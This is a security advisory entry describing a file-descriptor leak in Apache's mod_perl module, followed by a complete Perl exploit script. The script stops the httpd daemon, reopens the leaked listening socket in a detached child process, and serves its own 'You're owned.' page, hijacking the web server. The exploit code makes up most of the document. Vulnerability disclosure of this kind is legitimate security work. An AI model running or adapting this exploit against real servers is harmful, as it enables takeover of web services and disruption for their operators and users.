source: http://www.securityfocus.com/bid/9471/info

A vulnerability has been reported to exist in the Apache mod_perl module that may allow local attackers to gain access to privileged file descriptors. This issue could be exploited by an attacker to hijack a vulnerable server daemon. Other attacks are also possible.

It has been reported that multiple file descriptors, are leaked to the mod_perl module and any processes it creates. This allows for Perl scripts and any processes they spawn to access the privileged I/O streams.

#!/usr/bin/perl

use POSIX qw(setsid);

if (!defined(my $pid = fork)) {
        print "Content-Type: text/html\n\n";
        print "cannot fork: $!";
        exit 1;
} elsif ($pid) { # This is the parent
        sleep(1);
        print "Content-Type: text/html\n\n";
        print "<html><body>Exploit installed</body></html>";
        system '/usr/sbin/httpd2 -k stop';
        sleep(2);
        exit 0;
}

# This is the Child
setsid;
sleep(2);
my $leak = 4;
open(Server, "+<&$leak");
while (1) {
        my $rin = '';
        vec($rin,fileno(Server),1) = 1;
        $nfound = select($rout = $rin, undef, undef, undef);
        if (accept(Client,Server) ) {
                print Client "HTTP/1.0 200 OK\n";
                print Client "Content-Length: 40\n";
                print Client "Content-Type: text/html\n\n";
                print Client "<html><body>";
                print Client "You're owned.";
                print Client "</body></html>";
                close Client;
        }
}